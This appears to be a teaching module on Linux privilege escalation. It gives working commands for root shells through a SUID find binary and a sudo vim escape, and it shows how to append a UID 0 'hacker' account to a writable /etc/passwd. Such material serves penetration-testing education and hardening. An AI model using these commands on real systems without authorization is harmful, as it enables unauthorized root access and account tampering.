# Module 13 Examples: Linux Privilege Escalation

## 1. Exploiting SUID Binaries (GTFOBins)
If a system administrator incorrectly sets the SUID bit on certain binaries, they can be abused to escalate privileges.

**Step 1: Find SUID files**
```bash
find / -perm -4000 2>/dev/null
```
*Result shows `/usr/bin/find` has the SUID bit set.*

**Step 2: Exploit using GTFOBins technique**
The `find` command can execute other commands using `-exec`. Because it has SUID set, the executed command runs as root.
```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
# root
```

## 2. Sudo Misconfiguration (Escaping via Vim)
**Step 1: Check what you can run as sudo**
```bash
sudo -l
```
*Result:* `User www-data may run the following commands... (root) NOPASSWD: /usr/bin/vim`

**Step 2: Exploit**
Run vim as root, then invoke a shell from within vim.
```bash
sudo vim /tmp/testfile
# Once inside Vim, type:
:!/bin/sh
# whoami
# root
```

## 3. Writable `/etc/passwd`
If the `/etc/passwd` file has weak permissions (e.g., `-rw-rw-rw-`), any user can add a new root account.

**Step 1: Generate a password hash**
```bash
openssl passwd -1 "password123"
# Output: $1$R8f2F$4.5a3j...
```

**Step 2: Append a new user to `/etc/passwd`**
Add a user `hacker` with UID 0 (root) and GID 0 (root).
```bash
echo 'hacker:$1$R8f2F$4.5a3j...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
# Enter "password123"
# whoami
# root
```
